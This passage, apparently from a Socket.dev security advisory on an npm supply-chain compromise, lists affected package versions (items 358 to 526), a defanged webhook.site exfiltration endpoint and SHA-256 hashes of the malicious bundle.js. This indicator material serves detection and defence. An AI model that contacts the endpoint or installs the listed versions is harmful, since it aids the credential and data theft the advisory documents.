358. [@things-factory/email-base@9.0.51](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.51/bundle.js)
359. [@things-factory/email-base@9.0.52](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.52/bundle.js)
360. [@things-factory/email-base@9.0.53](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.53/bundle.js)
361. [@things-factory/email-base@9.0.54](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.54/bundle.js)
362. [@things-factory/email-base@9.0.55](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.55/bundle.js)
363. [@things-factory/email-base@9.0.56](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.56/bundle.js)
364. [@things-factory/email-base@9.0.57](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.57/bundle.js)
365. [@things-factory/email-base@9.0.58](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.58/bundle.js)
366. [@things-factory/email-base@9.0.59](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.59/bundle.js)
367. [@things-factory/env@9.0.42](https://socket.dev/npm/package/@things-factory/env/files/9.0.42/bundle.js)
368. [@things-factory/env@9.0.43](https://socket.dev/npm/package/@things-factory/env/files/9.0.43/bundle.js)
369. [@things-factory/env@9.0.44](https://socket.dev/npm/package/@things-factory/env/files/9.0.44/bundle.js)
370. [@things-factory/env@9.0.45](https://socket.dev/npm/package/@things-factory/env/files/9.0.45/bundle.js)
371. [@things-factory/integration-base@9.0.42](https://socket.dev/npm/package/@things-factory/integration-base/files/9.0.42/bundle.js)
372. [@things-factory/integration-base@9.0.43](https://socket.dev/npm/package/@things-factory/integration-base/files/9.0.43/bundle.js)
373. [@things-factory/integration-base@9.0.44](https://socket.dev/npm/package/@things-factory/integration-base/files/9.0.44/bundle.js)
374. [@things-factory/integration-base@9.0.45](https://socket.dev/npm/package/@things-factory/integration-base/files/9.0.45/bundle.js)
375. [@things-factory/integration-marketplace@9.0.43](https://socket.dev/npm/package/@things-factory/integration-marketplace/files/9.0.43/bundle.js)
376. [@things-factory/integration-marketplace@9.0.44](https://socket.dev/npm/package/@things-factory/integration-marketplace/files/9.0.44/bundle.js)
377. [@things-factory/integration-marketplace@9.0.45](https://socket.dev/npm/package/@things-factory/integration-marketplace/files/9.0.45/bundle.js)
378. [@things-factory/shell@9.0.42](https://socket.dev/npm/package/@things-factory/shell/files/9.0.42/bundle.js)
379. [@things-factory/shell@9.0.43](https://socket.dev/npm/package/@things-factory/shell/files/9.0.43/bundle.js)
380. [@things-factory/shell@9.0.44](https://socket.dev/npm/package/@things-factory/shell/files/9.0.44/bundle.js)
381. [@things-factory/shell@9.0.45](https://socket.dev/npm/package/@things-factory/shell/files/9.0.45/bundle.js)
382. [@tnf-dev/api@1.0.8](https://socket.dev/npm/package/@tnf-dev/api/files/1.0.8/bundle.js)
383. [@tnf-dev/core@1.0.8](https://socket.dev/npm/package/@tnf-dev/core/files/1.0.8/bundle.js)
384. [@tnf-dev/js@1.0.8](https://socket.dev/npm/package/@tnf-dev/js/files/1.0.8/bundle.js)
385. [@tnf-dev/mui@1.0.8](https://socket.dev/npm/package/@tnf-dev/mui/files/1.0.8/bundle.js)
386. [@tnf-dev/react@1.0.8](https://socket.dev/npm/package/@tnf-dev/react/files/1.0.8/bundle.js)
387. [@ui-ux-gang/devextreme-angular-rpk@24.1.7](https://socket.dev/npm/package/@ui-ux-gang/devextreme-angular-rpk/files/24.1.7/bundle.js)
388. [@yoobic/design-system@6.5.17](https://socket.dev/npm/package/@yoobic/design-system/files/6.5.17/bundle.js)
389. [@yoobic/jpeg-camera-es6@1.0.13](https://socket.dev/npm/package/@yoobic/jpeg-camera-es6/files/1.0.13/bundle.js)
390. [@yoobic/yobi@8.7.53](https://socket.dev/npm/package/@yoobic/yobi/files/8.7.53/bundle.js)
391. [airchief@0.3.1](https://socket.dev/npm/package/airchief/files/0.3.1/bundle.js)
392. [airpilot@0.8.8](https://socket.dev/npm/package/airpilot/files/0.8.8/bundle.js)
393. [angulartics2@14.1.1](https://socket.dev/npm/package/angulartics2/files/14.1.1/bundle.js)
394. [angulartics2@14.1.2](https://socket.dev/npm/package/angulartics2/files/14.1.2/bundle.js)
395. [another-shai@1.0.1](https://socket.dev/npm/package/another-shai/files/1.0.1/bundle.js)
396. [browser-webdriver-downloader@3.0.8](https://socket.dev/npm/package/browser-webdriver-downloader/files/3.0.8/bundle.js)
397. [capacitor-notificationhandler@0.0.2](https://socket.dev/npm/package/capacitor-notificationhandler/files/0.0.2/bundle.js)
398. [capacitor-notificationhandler@0.0.3](https://socket.dev/npm/package/capacitor-notificationhandler/files/0.0.3/bundle.js)
399. [capacitor-plugin-healthapp@0.0.2](https://socket.dev/npm/package/capacitor-plugin-healthapp/files/0.0.2/bundle.js)
400. [capacitor-plugin-healthapp@0.0.3](https://socket.dev/npm/package/capacitor-plugin-healthapp/files/0.0.3/bundle.js)
401. [capacitor-plugin-ihealth@1.1.8](https://socket.dev/npm/package/capacitor-plugin-ihealth/files/1.1.8/bundle.js)
402. [capacitor-plugin-ihealth@1.1.9](https://socket.dev/npm/package/capacitor-plugin-ihealth/files/1.1.9/bundle.js)
403. [capacitor-plugin-vonage@1.0.2](https://socket.dev/npm/package/capacitor-plugin-vonage/files/1.0.2/bundle.js)
404. [capacitor-plugin-vonage@1.0.3](https://socket.dev/npm/package/capacitor-plugin-vonage/files/1.0.3/bundle.js)
405. [capacitorandroidpermissions@0.0.4](https://socket.dev/npm/package/capacitorandroidpermissions/files/0.0.4/bundle.js)
406. [capacitorandroidpermissions@0.0.5](https://socket.dev/npm/package/capacitorandroidpermissions/files/0.0.5/bundle.js)
407. [config-cordova@0.8.5](https://socket.dev/npm/package/config-cordova/files/0.8.5/bundle.js)
408. [cordova-plugin-voxeet2@1.0.24](https://socket.dev/npm/package/cordova-plugin-voxeet2/files/1.0.24/bundle.js)
409. [cordova-voxeet@1.0.32](https://socket.dev/npm/package/cordova-voxeet/files/1.0.32/bundle.js)
410. [create-hest-app@0.1.9](https://socket.dev/npm/package/create-hest-app/files/0.1.9/bundle.js)
411. [db-evo@1.1.4](https://socket.dev/npm/package/db-evo/files/1.1.4/bundle.js)
412. [db-evo@1.1.5](https://socket.dev/npm/package/db-evo/files/1.1.5/bundle.js)
413. [devextreme-angular-rpk@21.2.8](https://socket.dev/npm/package/devextreme-angular-rpk/files/21.2.8/bundle.js)
414. [ember-browser-services@5.0.2](https://socket.dev/npm/package/ember-browser-services/files/5.0.2/bundle.js)
415. [ember-browser-services@5.0.3](https://socket.dev/npm/package/ember-browser-services/files/5.0.3/bundle.js)
416. [ember-headless-form-yup@1.0.1](https://socket.dev/npm/package/ember-headless-form-yup/files/1.0.1/bundle.js)
417. [ember-headless-form@1.1.2](https://socket.dev/npm/package/ember-headless-form/files/1.1.2/bundle.js)
418. [ember-headless-form@1.1.3](https://socket.dev/npm/package/ember-headless-form/files/1.1.3/bundle.js)
419. [ember-headless-table@2.1.5](https://socket.dev/npm/package/ember-headless-table/files/2.1.5/bundle.js)
420. [ember-headless-table@2.1.6](https://socket.dev/npm/package/ember-headless-table/files/2.1.6/bundle.js)
421. [ember-url-hash-polyfill@1.0.12](https://socket.dev/npm/package/ember-url-hash-polyfill/files/1.0.12/bundle.js)
422. [ember-url-hash-polyfill@1.0.13](https://socket.dev/npm/package/ember-url-hash-polyfill/files/1.0.13/bundle.js)
423. [ember-velcro@2.2.1](https://socket.dev/npm/package/ember-velcro/files/2.2.1/bundle.js)
424. [ember-velcro@2.2.2](https://socket.dev/npm/package/ember-velcro/files/2.2.2/bundle.js)
425. [encounter-playground@0.0.2](https://socket.dev/npm/package/encounter-playground/files/0.0.2/bundle.js)
426. [encounter-playground@0.0.3](https://socket.dev/npm/package/encounter-playground/files/0.0.3/bundle.js)
427. [encounter-playground@0.0.4](https://socket.dev/npm/package/encounter-playground/files/0.0.4/bundle.js)
428. [encounter-playground@0.0.5](https://socket.dev/npm/package/encounter-playground/files/0.0.5/bundle.js)
429. [eslint-config-crowdstrike-node@4.0.3](https://socket.dev/npm/package/eslint-config-crowdstrike-node/files/4.0.3/bundle.js)
430. [eslint-config-crowdstrike-node@4.0.4](https://socket.dev/npm/package/eslint-config-crowdstrike-node/files/4.0.4/bundle.js)
431. [eslint-config-crowdstrike@11.0.2](https://socket.dev/npm/package/eslint-config-crowdstrike/files/11.0.2/bundle.js)
432. [eslint-config-crowdstrike@11.0.3](https://socket.dev/npm/package/eslint-config-crowdstrike/files/11.0.3/bundle.js)
433. [eslint-config-teselagen@6.1.7](https://socket.dev/npm/package/eslint-config-teselagen/files/6.1.7/bundle.js)
434. [eslint-config-teselagen@6.1.8](https://socket.dev/npm/package/eslint-config-teselagen/files/6.1.8/bundle.js)
435. [globalize-rpk@1.7.4](https://socket.dev/npm/package/globalize-rpk/files/1.7.4/bundle.js)
436. [graphql-sequelize-teselagen@5.3.8](https://socket.dev/npm/package/graphql-sequelize-teselagen/files/5.3.8/bundle.js)
437. [graphql-sequelize-teselagen@5.3.9](https://socket.dev/npm/package/graphql-sequelize-teselagen/files/5.3.9/bundle.js)
438. [html-to-base64-image@1.0.2](https://socket.dev/npm/package/html-to-base64-image/files/1.0.2/bundle.js)
439. [json-rules-engine-simplified@0.2.1](https://socket.dev/npm/package/json-rules-engine-simplified/files/0.2.1/bundle.js)
440. [json-rules-engine-simplified@0.2.4](https://socket.dev/npm/package/json-rules-engine-simplified/files/0.2.4/bundle.js)
441. [jumpgate@0.0.2](https://socket.dev/npm/package/jumpgate/files/0.0.2/bundle.js)
442. [koa2-swagger-ui@5.11.1](https://socket.dev/npm/package/koa2-swagger-ui/files/5.11.1/bundle.js)
443. [koa2-swagger-ui@5.11.2](https://socket.dev/npm/package/koa2-swagger-ui/files/5.11.2/bundle.js)
444. [mcfly-semantic-release@1.3.1](https://socket.dev/npm/package/mcfly-semantic-release/files/1.3.1/bundle.js)
445. [mcp-knowledge-base@0.0.2](https://socket.dev/npm/package/mcp-knowledge-base/files/0.0.2/bundle.js)
446. [mcp-knowledge-graph@1.2.1](https://socket.dev/npm/package/mcp-knowledge-graph/files/1.2.1/bundle.js)
447. [mobioffice-cli@1.0.3](https://socket.dev/npm/package/mobioffice-cli/files/1.0.3/bundle.js)
448. [monorepo-next@13.0.1](https://socket.dev/npm/package/monorepo-next/files/13.0.1/bundle.js)
449. [monorepo-next@13.0.2](https://socket.dev/npm/package/monorepo-next/files/13.0.2/bundle.js)
450. [mstate-angular@0.4.4](https://socket.dev/npm/package/mstate-angular/files/0.4.4/bundle.js)
451. [mstate-cli@0.4.7](https://socket.dev/npm/package/mstate-cli/files/0.4.7/bundle.js)
452. [mstate-dev-react@1.1.1](https://socket.dev/npm/package/mstate-dev-react/files/1.1.1/bundle.js)
453. [mstate-react@1.6.5](https://socket.dev/npm/package/mstate-react/files/1.6.5/bundle.js)
454. [ng2-file-upload@7.0.2](https://socket.dev/npm/package/ng2-file-upload/files/7.0.2/bundle.js)
455. [ng2-file-upload@7.0.3](https://socket.dev/npm/package/ng2-file-upload/files/7.0.3/bundle.js)
456. [ng2-file-upload@8.0.1](https://socket.dev/npm/package/ng2-file-upload/files/8.0.1/bundle.js)
457. [ng2-file-upload@8.0.2](https://socket.dev/npm/package/ng2-file-upload/files/8.0.2/bundle.js)
458. [ng2-file-upload@8.0.3](https://socket.dev/npm/package/ng2-file-upload/files/8.0.3/bundle.js)
459. [ng2-file-upload@9.0.1](https://socket.dev/npm/package/ng2-file-upload/files/9.0.1/bundle.js)
460. [ngx-bootstrap@18.1.4](https://socket.dev/npm/package/ngx-bootstrap/files/18.1.4/bundle.js)
461. [ngx-bootstrap@19.0.3](https://socket.dev/npm/package/ngx-bootstrap/files/19.0.3/bundle.js)
462. [ngx-bootstrap@19.0.4](https://socket.dev/npm/package/ngx-bootstrap/files/19.0.4/bundle.js)
463. [ngx-bootstrap@20.0.3](https://socket.dev/npm/package/ngx-bootstrap/files/20.0.3/bundle.js)
464. [ngx-bootstrap@20.0.4](https://socket.dev/npm/package/ngx-bootstrap/files/20.0.4/bundle.js)
465. [ngx-bootstrap@20.0.5](https://socket.dev/npm/package/ngx-bootstrap/files/20.0.5/bundle.js)
466. [ngx-color@10.0.1](https://socket.dev/npm/package/ngx-color/files/10.0.1/bundle.js)
467. [ngx-color@10.0.2](https://socket.dev/npm/package/ngx-color/files/10.0.2/bundle.js)
468. [ngx-toastr@19.0.1](https://socket.dev/npm/package/ngx-toastr/files/19.0.1/bundle.js)
469. [ngx-toastr@19.0.2](https://socket.dev/npm/package/ngx-toastr/files/19.0.2/bundle.js)
470. [ngx-trend@8.0.1](https://socket.dev/npm/package/ngx-trend/files/8.0.1/bundle.js)
471. [ngx-ws@1.1.5](https://socket.dev/npm/package/ngx-ws/files/1.1.5/bundle.js)
472. [ngx-ws@1.1.6](https://socket.dev/npm/package/ngx-ws/files/1.1.6/bundle.js)
473. [oradm-to-gql@35.0.14](https://socket.dev/npm/package/oradm-to-gql/files/35.0.14/bundle.js)
474. [oradm-to-gql@35.0.15](https://socket.dev/npm/package/oradm-to-gql/files/35.0.15/bundle.js)
475. [oradm-to-sqlz@1.1.2](https://socket.dev/npm/package/oradm-to-sqlz/files/1.1.2/bundle.js)
476. [ove-auto-annotate@0.0.10](https://socket.dev/npm/package/ove-auto-annotate/files/0.0.10/bundle.js)
477. [ove-auto-annotate@0.0.9](https://socket.dev/npm/package/ove-auto-annotate/files/0.0.9/bundle.js)
478. [pm2-gelf-json@1.0.4](https://socket.dev/npm/package/pm2-gelf-json/files/1.0.4/bundle.js)
479. [pm2-gelf-json@1.0.5](https://socket.dev/npm/package/pm2-gelf-json/files/1.0.5/bundle.js)
480. [printjs-rpk@1.6.1](https://socket.dev/npm/package/printjs-rpk/files/1.6.1/bundle.js)
481. [react-complaint-image@0.0.32](https://socket.dev/npm/package/react-complaint-image/files/0.0.32/bundle.js)
482. [react-complaint-image@0.0.35](https://socket.dev/npm/package/react-complaint-image/files/0.0.35/bundle.js)
483. [react-jsonschema-form-conditionals@0.3.18](https://socket.dev/npm/package/react-jsonschema-form-conditionals/files/0.3.18/bundle.js)
484. [react-jsonschema-form-conditionals@0.3.21](https://socket.dev/npm/package/react-jsonschema-form-conditionals/files/0.3.21/bundle.js)
485. [react-jsonschema-form-extras@1.0.4](https://socket.dev/npm/package/react-jsonschema-form-extras/files/1.0.4/bundle.js)
486. [react-jsonschema-rxnt-extras@0.4.9](https://socket.dev/npm/package/react-jsonschema-rxnt-extras/files/0.4.9/bundle.js)
487. [remark-preset-lint-crowdstrike@4.0.1](https://socket.dev/npm/package/remark-preset-lint-crowdstrike/files/4.0.1/bundle.js)
488. [remark-preset-lint-crowdstrike@4.0.2](https://socket.dev/npm/package/remark-preset-lint-crowdstrike/files/4.0.2/bundle.js)
489. [rxnt-authentication@0.0.3](https://socket.dev/npm/package/rxnt-authentication/files/0.0.3/bundle.js)
490. [rxnt-authentication@0.0.4](https://socket.dev/npm/package/rxnt-authentication/files/0.0.4/bundle.js)
491. [rxnt-authentication@0.0.5](https://socket.dev/npm/package/rxnt-authentication/files/0.0.5/bundle.js)
492. [rxnt-authentication@0.0.6](https://socket.dev/npm/package/rxnt-authentication/files/0.0.6/bundle.js)
493. [rxnt-healthchecks-nestjs@1.0.2](https://socket.dev/npm/package/rxnt-healthchecks-nestjs/files/1.0.2/bundle.js)
494. [rxnt-healthchecks-nestjs@1.0.3](https://socket.dev/npm/package/rxnt-healthchecks-nestjs/files/1.0.3/bundle.js)
495. [rxnt-healthchecks-nestjs@1.0.4](https://socket.dev/npm/package/rxnt-healthchecks-nestjs/files/1.0.4/bundle.js)
496. [rxnt-healthchecks-nestjs@1.0.5](https://socket.dev/npm/package/rxnt-healthchecks-nestjs/files/1.0.5/bundle.js)
497. [rxnt-kue@1.0.4](https://socket.dev/npm/package/rxnt-kue/files/1.0.4/bundle.js)
498. [rxnt-kue@1.0.5](https://socket.dev/npm/package/rxnt-kue/files/1.0.5/bundle.js)
499. [rxnt-kue@1.0.6](https://socket.dev/npm/package/rxnt-kue/files/1.0.6/bundle.js)
500. [rxnt-kue@1.0.7](https://socket.dev/npm/package/rxnt-kue/files/1.0.7/bundle.js)
501. [swc-plugin-component-annotate@1.9.1](https://socket.dev/npm/package/swc-plugin-component-annotate/files/1.9.1/bundle.js)
502. [swc-plugin-component-annotate@1.9.2](https://socket.dev/npm/package/swc-plugin-component-annotate/files/1.9.2/bundle.js)
503. [tbssnch@1.0.2](https://socket.dev/npm/package/tbssnch/files/1.0.2/bundle.js)
504. [teselagen-interval-tree@1.1.2](https://socket.dev/npm/package/teselagen-interval-tree/files/1.1.2/bundle.js)
505. [tg-client-query-builder@2.14.4](https://socket.dev/npm/package/tg-client-query-builder/files/2.14.4/bundle.js)
506. [tg-client-query-builder@2.14.5](https://socket.dev/npm/package/tg-client-query-builder/files/2.14.5/bundle.js)
507. [tg-redbird@1.3.1](https://socket.dev/npm/package/tg-redbird/files/1.3.1/bundle.js)
508. [tg-redbird@1.3.2](https://socket.dev/npm/package/tg-redbird/files/1.3.2/bundle.js)
509. [tg-seq-gen@1.0.10](https://socket.dev/npm/package/tg-seq-gen/files/1.0.10/bundle.js)
510. [tg-seq-gen@1.0.9](https://socket.dev/npm/package/tg-seq-gen/files/1.0.9/bundle.js)
511. [thangved-react-grid@1.0.3](https://socket.dev/npm/package/thangved-react-grid/files/1.0.3/bundle.js)
512. [ts-gaussian@3.0.5](https://socket.dev/npm/package/ts-gaussian/files/3.0.5/bundle.js)
513. [ts-gaussian@3.0.6](https://socket.dev/npm/package/ts-gaussian/files/3.0.6/bundle.js)
514. [ts-imports@1.0.1](https://socket.dev/npm/package/ts-imports/files/1.0.1/bundle.js)
515. [ts-imports@1.0.2](https://socket.dev/npm/package/ts-imports/files/1.0.2/bundle.js)
516. [tvi-cli@0.1.5](https://socket.dev/npm/package/tvi-cli/files/0.1.5/bundle.js)
517. [ve-bamreader@0.2.6](https://socket.dev/npm/package/ve-bamreader/files/0.2.6/bundle.js)
518. [ve-bamreader@0.2.7](https://socket.dev/npm/package/ve-bamreader/files/0.2.7/bundle.js)
519. [ve-editor@1.0.1](https://socket.dev/npm/package/ve-editor/files/1.0.1/bundle.js)
520. [ve-editor@1.0.2](https://socket.dev/npm/package/ve-editor/files/1.0.2/bundle.js)
521. [verror-extra@6.0.1](https://socket.dev/npm/package/verror-extra/files/6.0.1/bundle.js)
522. [voip-callkit@1.0.2](https://socket.dev/npm/package/voip-callkit/files/1.0.2/bundle.js)
523. [voip-callkit@1.0.3](https://socket.dev/npm/package/voip-callkit/files/1.0.3/bundle.js)
524. [wdio-web-reporter@0.1.3](https://socket.dev/npm/package/wdio-web-reporter/files/0.1.3/bundle.js)
525. [yargs-help-output@5.0.3](https://socket.dev/npm/package/yargs-help-output/files/5.0.3/bundle.js)
526. [yoo-styles@6.0.326](https://socket.dev/npm/package/yoo-styles/files/6.0.326/bundle.js)

The attack surface is growing and we will continue updating this list. Please check back often.

- Exfiltration endpoint: **`hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`**

`Bundle.js SHA-256`

- `de0e25a3e6c1e1e5998b306b7141b3dc4c0088da9d7bb47c1c00c91e6e4f85d6`
- `81d2a004a1bca6ef87a1caf7d0e0b355ad1764238e40ff6d1b1cb77ad4f595c3`
- `83a650ce44b2a9854802a7fb4c202877815274c129af49e6c2d1d5d5d55c501e`
- `4b2399646573bb737c4969563303d8ee2e9ddbd1b271f1ca9e35ea78062538db`
- `dc67467a39b70d1cd4c1f7f7a459b35058163592f4a9e8fb4dffcbba98ef210c`
- `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`
- `b74caeaa75e077c99f7d44f46daaf9796a3be43ecf24f2a1fd381844669da777`

Subscribe to our newsletter

Get notified when we publish new security blog posts!

Enter your email

Subscribe

Try it now

### Ready to block malicious and vulnerable dependencies?

[Install GitHub App](https://socket.dev/github-app) [Book a Demo](https://socket.dev/demo)

## Related posts

[Back to all posts](https://socket.dev/blog)

![AI + a16z Podcast: Vibe Coding, Security Risks, and the Path to Progress](https://cdn.sanity.io/images/cgdhsj6q/production/4dd46aa039847263834552da42027464834e3dfc-412x412.png?w=400&q=95&fit=max&auto=format)

Application Security

/

Security News

### [AI + a16z Podcast: Vibe Coding, Security Risks, and the Path to Progress](https://socket.dev/blog/ai-a16z-podcast-vibe-coding-security-risks-and-the-path-to-progress)

Socket CEO Feross Aboukhadijeh and a16z partner Joel de la Garza discuss vibe coding, AI-driven software development, and how the rise of LLMs, despite their risks, still points toward a more secure and innovative future.

By Sarah Gooding  \-  Jul 25, 2025

![Creating an Effective Vulnerability Management Program for Open Source Vulnerabilities](https://cdn.sanity.io/images/cgdhsj6q/production/5ef4e2f8e41c50979ffd7d935bb0c7de0d793873-1600x900.png?w=400&q=95&fit=max&auto=format)

Application Security

### [Creating an Effective Vulnerability Management Program for Open Source Vulnerabilities](https://socket.dev/blog/creating-an-effective-vulnerability-management-program-for-open-source-vulnerabilities)

Learn how to design a sustainable vulnerability management program by balancing risk tolerance, security policies, and team resources.

By Martin Torp  \-  Dec 17, 2024

![How to Evaluate an SCA with Reachability: Benchmarking Hard-to-Analyze Language Features](https://cdn.sanity.io/images/cgdhsj6q/production/5fc9c8497fed6c2febd5999fea5e173cee5fd4c6-1600x900.png?w=400&q=95&fit=max&auto=format)

Application Security

### [How to Evaluate an SCA with Reachability: Benchmarking Hard-to-Analyze Language Features](https://socket.dev/blog/how-to-evaluate-an-sca-with-reachability)

Learn how to effectively assess the accuracy, and consequently the trustworthiness, of a reachability analysis.

By Martin Torp  \-  Nov 05, 2024
